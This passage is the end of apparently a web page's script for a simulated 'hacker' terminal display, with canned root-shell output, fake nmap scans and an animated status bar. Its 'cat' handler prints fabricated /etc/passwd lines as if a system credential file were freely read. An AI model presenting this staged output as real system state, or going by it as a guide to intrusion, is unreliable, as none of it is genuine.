        break;
      case 'whoami':
        out.push(['root', '']);
        break;
      case 'id':
        out.push(['uid=0(root) gid=0(root) groups=0(root)', '']);
        break;
      case 'uname':
        out.push([arg.indexOf('-a') >= 0
          ? 'Linux nexus 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC Fri Aug 30 12:02:04 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux'
          : 'Linux', '']);
        break;
      case 'hostname':
        out.push(['nexus', '']);
        break;
      case 'pwd':
        out.push(['/root', '']);
        break;
      case 'ls':
        out.push(['total 28', '']);
        out.push(['drwx------  6 root root 4096 Oct 20 18:12 .', '']);
        out.push(['drwxr-xr-x 20 root root 4096 Sep 14 09:31 ..', '']);
        out.push(['-rw-------  1 root root 3421 Oct 20 17:58 .bash_history', '']);
        out.push(['drwx------  3 root root 4096 Oct 20 18:02 .cache', '']);
        out.push(['drwx------  4 root root 4096 Oct 20 11:07 .ssh', '']);
        out.push(['drwxr-xr-x  2 root root 4096 Oct 20 16:20 tools', '']);
        break;
      case 'cat':
        if (!arg) {
          out.push(['cat: missing operand', 'err']);
        } else if (arg.indexOf('passwd') >= 0) {
          out.push(['root:x:0:0:root:/root:/bin/bash', '']);
          out.push(['daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin', '']);
          out.push(['www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin', '']);
          out.push(['deploy:x:1001:1001::/home/deploy:/bin/bash', '']);
        } else {
          out.push(['cat: ' + arg + ': No such file or directory', 'err']);
        }
        break;
      case 'ps':
        out.push(['    PID TTY          TIME CMD', 'head']);
        out.push(['   2148 pts/0    00:00:00 bash', '']);
        out.push(['   2210 pts/0    00:00:00 ps', '']);
        break;
      case 'ping':
        out.push(['PING ' + ipArg + ' (' + ipArg + ') 56(84) bytes of data.', '']);
        for (let i = 1; i <= 4; i++) {
          out.push(['64 bytes from ' + ipArg + ': icmp_seq=' + i + ' ttl=64 time=' + rnd(0.2, 0.9).toFixed(3) + ' ms', '']);
        }
        out.push(['', '']);
        out.push(['--- ' + ipArg + ' ping statistics ---', '']);
        out.push(['4 packets transmitted, 4 received, 0% packet loss, time 3004ms', '']);
        out.push(['rtt min/avg/max/mdev = 0.298/0.334/0.371/0.027 ms', '']);
        break;
      case 'nmap':
        out.push(['Starting Nmap 7.94SVN ( https://nmap.org ) at ' + nmapDate(), '']);
        out.push(['Nmap scan report for ' + ipArg, '']);
        out.push(['Host is up (0.0019s latency).', '']);
        out.push(['Not shown: 997 closed tcp ports (reset)', '']);
        out.push(['PORT   STATE SERVICE', 'head']);
        out.push(['22/tcp open  ssh', '']);
        out.push(['80/tcp open  http', '']);
        out.push(['443/tcp open https', '']);
        break;
      case 'ifconfig':
        out.push(['eno1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500', '']);
        out.push(['        inet 10.42.7.44  netmask 255.255.255.0  broadcast 10.42.7.255', '']);
        out.push(['        ether 38:18:4c:7a:2f:91  txqueuelen 1000  (Ethernet)', '']);
        out.push(['        RX packets 1842231  bytes 2147269318 (2.1 GB)', '']);
        out.push(['        TX packets 912884  bytes 118209043 (118.2 MB)', '']);
        break;
      case 'ip':
        out.push(['1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000', '']);
        out.push(['    inet 127.0.0.1/8 scope host lo', '']);
        out.push(['2: eno1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000', '']);
        out.push(['    inet 10.42.7.44/24 brd 10.42.7.255 scope global dynamic eno1', '']);
        break;
      case 'history':
        if (!hist.length) out.push(['    1  history', '']);
        else hist.forEach((h, i) => out.push(['  ' + (i + 1) + '  ' + h, '']));
        break;
      case 'clear':
        return { clear: true, lines: [] };
      case 'sudo':
        if (!arg) { out.push(['usage: sudo command', 'err']); break; }
        return runCmd(arg);
      case 'exit':
        out.push(['logout', '']);
        break;
      default:
        out.push(['bash: ' + cmd + ': command not found', 'err']);
    }
    return { lines: out, clear: false };
  }

  /* ---------- status bar ---------- */
  const load = [0.42, 0.38, 0.31];
  const sparkData = Array.from({ length: 34 }, () => ri(0, 7));
  const SPARK = '\u2581\u2582\u2583\u2584\u2585\u2586\u2587\u2588';

  function statusFrame() {
    load[0] = Math.max(0.02, load[0] + rnd(-0.1, 0.1));
    load[1] = Math.max(0.02, load[1] + rnd(-0.05, 0.05));
    load[2] = Math.max(0.02, load[2] + rnd(-0.03, 0.03));
    $('stLoad').textContent = 'load ' + load.map((x) => x.toFixed(2)).join(' ');

    const up = Math.floor((Date.now() - S.startedAt) / 1000);
    $('stUp').textContent = 'up ' + Math.floor(up / 60) + ':' + padL(up % 60, 2);

    sparkData.push(ri(0, 7));
    sparkData.shift();
    $('stSpark').textContent = sparkData.map((v) => SPARK[v]).join('');

    $('stClock').textContent = hms();
  }

  setInterval(statusFrame, 900);
  statusFrame();

  /* ---------- debug / test hook ---------- */
  let resolveReady;
  const ready = new Promise((r) => { resolveReady = r; });

  window.__hx = {
    ready: ready,
    state: S,
    dump: () => T.dump(),
    dumpBoot: () => bootEl.textContent,
    run: (cmd) => runCmd(cmd),
    audioCreated: () => !!audio.ac,
    rainFrame: () => rainFrame(),
    resizeRain: () => resizeRain(),
    history: () => hist.slice(),
    campaign: () => campaign,
    hosts: () => campaign ? campaign.hosts.map((h) => ({ name: h.name, state: h.state, ip: h.ip })) : [],
    typos: () => campaign ? campaign.typos : 0,
    stop() { S.halt = true; },
    async cycle(n) {
      S.halt = true;
      S.fast = true;
      await Promise.race([loopExit, sleep(3000)]);
      S.mode = 'auto';
      try {
        for (let i = 0; i < (n || 1); i++) await runCampaign();
      } finally {
        S.fast = false;
      }
      if (mainScroll) mainScroll.scrollTop = mainScroll.scrollHeight;
      return T.dump();
    },
  };

  /* ---------- start ---------- */
  (async () => {
    await bootRun();
    resolveReady();
    if (!S.halt) sessionLoop(); else loopDone();
  })();

  window.addEventListener('visibilitychange', () => {
    if (!audio.ac) return;
    if (document.hidden) audio.ac.suspend();
    else if (audio.on) audio.ac.resume();
  });
})();
</script>

</body>
